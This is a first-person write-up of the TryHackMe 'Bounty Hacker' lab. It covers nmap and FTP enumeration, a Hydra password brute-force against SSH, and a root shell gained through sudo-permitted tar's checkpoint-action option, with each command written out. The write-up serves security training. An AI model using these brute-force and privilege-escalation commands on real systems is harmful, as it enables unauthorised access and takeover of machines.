````markdown
# TryHackMe — Bounty Hacker

## Overview

Bounty Hacker is a Linux-based TryHackMe room focused on enumeration, gaining an initial foothold, and Linux privilege escalation.

I solved this room independently without using a walkthrough or hints.

The main attack path was:

`FTP Enumeration → Credential Discovery → SSH Access → Sudo Enumeration → Tar Abuse → Root`

---

## Enumeration

I started with an Nmap scan to identify the services running on the target.

```bash
nmap -sC -sV TARGET_IP
````

The scan revealed multiple services, including FTP and SSH.

I decided to investigate FTP first.

---

## FTP Enumeration

I connected to the FTP service:

```bash
ftp TARGET_IP
```

The FTP server did not give a straightforward directory listing, but I was still able to access files that were available on the server.

Two interesting files were:

```text
locks.txt
task.txt
```

I downloaded them for further investigation.

After checking `task.txt`, I found a username:

```text
lin
```

The `locks.txt` file contained a list of possible passwords.

At this point, I had:

```text
Username: lin
Password list: locks.txt
```

---

## Getting Initial Access

Since SSH was running on the target, I tried using the discovered username and password list against SSH.

I used Hydra:

```bash
hydra -l lin -P locks.txt ssh://TARGET_IP
```

After finding valid credentials, I logged in through SSH:

```bash
ssh lin@TARGET_IP
```

I now had shell access as the user `lin`.

---

## Privilege Escalation

After getting access, I checked what commands the current user could run with sudo:

```bash
sudo -l
```

The interesting result was that `/bin/tar` could be executed with root privileges.

This immediately looked interesting because `tar` can be abused to execute commands through its checkpoint functionality.

---

## Exploiting Tar

I used the following command:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

This gave me a shell with root privileges.

I verified the current user:

```bash
whoami
```

Output:

```text
root
```

So the privilege escalation was successful.

---

## Root Flag

Once I had root access, I moved into the `/root` directory:

```bash
cd /root
ls
```

I found the root flag file:

```text
root.txt
```

I read it with:

```bash
cat root.txt
```

This confirmed that I had successfully completed the machine.

---

## Attack Path

```text
Nmap
  ↓
FTP Enumeration
  ↓
task.txt + locks.txt
  ↓
Username: lin
  ↓
SSH Credential Discovery
  ↓
SSH Access as lin
  ↓
sudo -l
  ↓
/bin/tar allowed as root
  ↓
Tar Checkpoint Abuse
  ↓
Root Shell
  ↓
root.txt
```

## Key Takeaways

* Always enumerate all exposed services.
* FTP can sometimes provide useful files even when access appears restricted.
* Password lists and usernames found during enumeration can lead to the initial foothold.
* After getting a shell, checking `sudo -l` should be one of the first things to do.
* Misconfigured sudo permissions can turn a low-privileged account into root.
* Understanding how common Linux binaries can be abused is an important part of privilege escalation.

## Conclusion

Bounty Hacker was a good exercise in following the basic penetration testing methodology:

**Enumerate → Find a foothold → Enumerate again → Escalate → Root**

The best part for me was solving the complete attack path without using a walkthrough or hints.

```
```
